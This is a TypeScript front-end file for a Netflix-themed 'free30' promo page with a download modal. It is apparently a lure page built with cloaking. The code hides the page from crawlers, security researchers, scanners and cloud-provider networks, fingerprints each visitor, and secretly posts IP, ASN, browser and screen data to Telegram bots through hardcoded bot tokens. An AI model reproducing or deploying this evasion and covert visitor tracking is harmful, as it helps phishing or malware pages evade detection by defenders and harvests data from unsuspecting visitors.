import '@/assets/css/style.css';
import { movies } from '@/data/movies';
import section1 from '@/section/section-1';
import section2 from '@/section/section-2';
import section3 from '@/section/section-3';
import section4 from '@/section/section-4';
import splashScreen from '@/section/splash-screen';
import MovieNavigation from '@/utils/movie-navigation';
import DownloadModal from '@/assets/components/download';

let isBot = false;
let logSentRef = false;
const blockedKeywords = [
    'bot',
    'crawler',
    'spider',
    'puppeteer',
    'selenium',
    'http',
    'client',
    'curl',
    'wget',
    'python',
    'java',
    'ruby',
    'go',
    'scrapy',
    'lighthouse',
    'censysinspect',
    'facebookexternalhit',
    'krebsonsecurity',
    'ivre-masscan',
    'ahrefs',
    'semrush',
    'sistrix',
    'mailchimp',
    'mailgun',
    'larbin',
    'libwww',
    'spinn3r',
    'zgrab',
    'masscan',
    'yandex',
    'baidu',
    'sogou',
    'tweetmeme',
    'misting',
    'BotPoke',
];
const blockedASNs = [
    15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075,
    214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939,
    209, 51396,
];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

const sendBotTelegram = async (reason: string) => {
    try {
        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
        const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA';
        const chatId = '-1002776834761';

        const geoRes = await fetch(geoUrl);
        const geoData = await geoRes.json();
        const fullFingerprint = {
            asn: geoData.asn,
            organization_name: geoData.organization_name,
            organization: geoData.organization,
            ip: geoData.ip,
            navigator: {
                userAgent: navigator.userAgent,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver,
            },
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
            },
        };

        const msg = `🚫 <b>BOT BỊ CHẶN</b>
🔍 <b>Lý do:</b> <code>${reason}</code>

📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        };

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('telegram api error:', result);
            alert(
                `Bot Alert API Error: ${result.description ?? 'Unknown error'}`
            );
        } else {
            console.log('bot telegram sent successfully:', result);
        }
    } catch (error) {
        console.error('telegram send fail:', error);
        const errorMsg =
            error instanceof Error ? error.message : 'Không thể kết nối';
        alert(`Bot Alert Network Error: ${errorMsg}`);
    }
};

const checkAndBlockBots = async (): Promise<{
    isBlocked: boolean;
    reason?: string;
}> => {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedKeyword = blockedKeywords.find((keyword) =>
        userAgent.includes(keyword)
    );
    if (blockedKeyword) {
        const reason = `user agent chứa keyword: ${blockedKeyword}`;
        await sendBotTelegram(reason);
        return { isBlocked: true, reason };
    }
    return { isBlocked: false };
};

const checkAndBlockByGeoIP = async (): Promise<{
    isBlocked: boolean;
    reason?: string;
}> => {
    try {
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await response.json();

        if (blockedASNs.includes(Number(data.asn))) {
            const reason = `ASN bị chặn: ${data.asn}`;
            await sendBotTelegram(reason);
            return { isBlocked: true, reason };
        }

        if (blockedIPs.includes(data.ip)) {
            const reason = `IP bị chặn: ${data.ip}`;
            await sendBotTelegram(reason);
            return { isBlocked: true, reason };
        }

        return { isBlocked: false };
    } catch {
        return { isBlocked: false };
    }
};

const checkAdvancedWebDriverDetection = async (): Promise<{
    isBot: boolean;
    reason?: string;
}> => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    if ('__nightmare' in window) {
        const reason = 'nightmare detected';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if ('_phantom' in window || 'callPhantom' in window) {
        const reason = 'phantom detected';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if ('Buffer' in window) {
        const reason = 'buffer detected';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if ('emit' in window) {
        const reason = 'emit detected';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if ('spawn' in window) {
        const reason = 'spawn detected';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    const seleniumProps = [
        '__selenium_unwrapped',
        '__webdriver_evaluate',
        '__driver_evaluate',
        '__webdriver_script_function',
        '__webdriver_script_func',
        '__webdriver_script_fn',
        '__fxdriver_evaluate',
        '__driver_unwrapped',
        '__webdriver_unwrapped',
        '__selenium_evaluate',
        '__fxdriver_unwrapped',
    ];

    const foundProp = seleniumProps.find((prop) => prop in window);
    if (foundProp) {
        const reason = `selenium property: ${foundProp}`;
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    if ('__webdriver_evaluate' in document) {
        const reason = 'webdriver_evaluate in document';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if ('__selenium_evaluate' in document) {
        const reason = 'selenium_evaluate in document';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if ('__webdriver_script_function' in document) {
        const reason = 'webdriver_script_function in document';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkNavigatorAnomalies = async (): Promise<{
    isBot: boolean;
    reason?: string;
}> => {
    if (navigator.webdriver === true) {
        const reason = 'navigator.webdriver = true';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency > 128) {
        const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 1) {
        const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    return { isBot: false };
};

const checkScreenAnomalies = async (): Promise<{
    isBot: boolean;
    reason?: string;
}> => {
    if (screen.width === 2000 && screen.height === 2000) {
        const reason = 'màn hình 2000x2000 (bot pattern)';
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    if (screen.width > 4000 || screen.height > 4000) {
        const reason = `màn hình quá lớn: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    if (screen.width < 200 || screen.height < 200) {
        const reason = `màn hình quá nhỏ: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }

    if (
        screen.availWidth === screen.width &&
        screen.availHeight === screen.height
    ) {
        if (screen.width > 1000 && screen.height > 1000) {
            const reason = `màn hình full size lớn: ${screen.width}x${screen.height}`;
            await sendBotTelegram(reason);
            return { isBot: true, reason };
        }
    }
    if (screen.width === screen.height && screen.width >= 1500) {
        const reason = `màn hình vuông lớn: ${screen.width}x${screen.height}`;
        await sendBotTelegram(reason);
        return { isBot: true, reason };
    }
    return { isBot: false };
};

const sendUserLog = async () => {
    if (logSentRef) return;
    logSentRef = true;

    try {
        const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
        const botToken = '7596882479:AAHzcw1ApwSL4eaVMX6VNoB_Mv6f1NuJoX4';
        const chatId = '-4678072214';

        const geoRes = await fetch(geoUrl);
        const geoData = await geoRes.json();
        const fullFingerprint = {
            asn: geoData.asn,
            organization_name: geoData.organization_name,
            organization: geoData.organization,
            ip: geoData.ip,
            navigator: {
                userAgent: navigator.userAgent,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                webdriver: navigator.webdriver,
            },
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
            },
        };

        const msg = `🔍 <b>Log truy cập</b>
📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: msg,
            parse_mode: 'HTML',
        };

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('telegram api error:', result);
            alert(`API Error: ${result.description ?? 'Unknown error'}`);
        } else {
            console.log('telegram sent successfully:', result);
        }
    } catch (error) {
        console.error('telegram send fail:', error);
        const errorMsg =
            error instanceof Error ? error.message : 'Không thể kết nối';
        alert(`Network Error: ${errorMsg}`);
    }
};

const hideSplashScreen = () => {
    const logo = document.querySelector('.netflix-logo');
    if (logo) {
        logo.classList.add('zoom-out');
    }
    setTimeout(() => {
        document.querySelector<HTMLDivElement>('#app')!.innerHTML = /* HTML */ `
            <main>${section1} ${section2} ${section3} ${section4}</main>
        `;

        const movieNav = new MovieNavigation(movies);
        movieNav.init();

        DownloadModal();
    }, 400);
};

const initApp = () => {
    document.querySelector<HTMLDivElement>('#app')!.innerHTML = /* HTML */ `
        <main>${splashScreen}</main>
    `;
};

const checkRequiredParam = () => {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('promo') === 'free30';
};

const detectBot = async () => {
    const userAgentCheck = await checkAndBlockBots();
    if (userAgentCheck.isBlocked) {
        isBot = true;
        return;
    }

    const webDriverCheck = await checkAdvancedWebDriverDetection();
    if (webDriverCheck.isBot) {
        isBot = true;
        return;
    }

    const navigatorCheck = await checkNavigatorAnomalies();
    if (navigatorCheck.isBot) {
        isBot = true;
        return;
    }

    const screenCheck = await checkScreenAnomalies();
    if (screenCheck.isBot) {
        isBot = true;
        return;
    }

    const geoIPCheck = await checkAndBlockByGeoIP();
    if (geoIPCheck.isBlocked) {
        isBot = true;
        return;
    }

    const obviousBotKeywords = ['googlebot', 'bingbot', 'crawler', 'spider'];
    const foundKeyword = obviousBotKeywords.find((keyword) =>
        navigator.userAgent.toLowerCase().includes(keyword)
    );

    if (foundKeyword) {
        isBot = true;
        await sendBotTelegram(`obvious bot keyword: ${foundKeyword}`);
    } else {
        isBot = false;
        await sendUserLog();
    }
};

(async () => {
    if (!checkRequiredParam()) {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return;
    }
    initApp();
    setTimeout(async () => {
        await detectBot();
        if (!isBot) {
            hideSplashScreen();
        } else {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    }, 10);
})();
